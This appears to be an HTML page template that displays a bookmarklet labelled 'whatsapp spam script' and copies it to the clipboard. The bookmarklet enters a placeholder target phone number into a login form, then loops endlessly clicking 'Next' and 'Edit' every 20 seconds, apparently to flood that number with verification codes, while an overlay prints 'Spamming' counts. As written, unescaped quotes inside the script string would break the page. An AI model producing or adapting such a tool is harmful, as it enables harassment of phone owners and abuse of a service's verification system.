<html>
  <head>
    <script type="text/javascript">
      var key = 'javascript:(()=>{const s=ms=>new Promise(r=>setTimeout(r,ms));const overlay=document.createElement('div');overlay.style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:black;color:white;font-family:monospace;z-index:9999999;display:flex;flex-direction:column;padding:10px;font-size:32px;white-space:pre-wrap;overflow-y:auto;left:0;align-items:flex-start';document.body.appendChild(overlay);let counter=0;const printLine=()=>{const line=document.createElement('div');line.innerText=`> Spamming ${counter++}`;overlay.appendChild(line);};setInterval(printLine,1000);const CODE='+%whatsapp_number_prefix%,NUM='%whatsapp_number%';let b=Array.from(document.querySelectorAll('div[role="button"]')).find(e=>e.textContent.toLowerCase().includes('phone'));if(b)b.click();(async()=>{await s(1000);let i=null;while(!i){i=document.querySelector('input[aria-label="Type your phone number."]');await s(100);}i.focus();i.select();i.setRangeText(CODE+NUM);i.dispatchEvent(new Event('input',{bubbles:true}));await s(1000);while(1){let n=null;while(!n){n=Array.from(document.querySelectorAll('button')).find(e=>e.innerText.trim().toLowerCase()==='next');await s(100);}n.click();await s(1000);let e=null;while(!e){e=Array.from(document.querySelectorAll('a[role="button"]')).find(a=>a.textContent.trim().toLowerCase()==='edit');await s(100);}e.click();await s(20000);}})();})()';

      function copyText() {
        var textArea = document.createElement('textarea');
        textArea.value = key;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        alert('script copied to clipboard!');
        window.close();
      }

      window.onload = function() {
        // Resize the window
        window.resizeTo(520, 300);

        // Move the window to the center of the screen
        window.moveTo((screen.width - 520) / 2, (screen.height - 480) / 2);

        // Create and display the key and button
        var div = document.createElement('div');
        div.style.textAlign = 'center';
        div.innerHTML = '<h3>This is your whatsapp spam script, make sure you copy it</h3><p>' + key + '</p><button onclick="copyText()">Copy Spam Script</button>';
        document.body.appendChild(div);
      }
    </script>
  </head>
  <body>
    <h1></h1>
  </body>
</html>
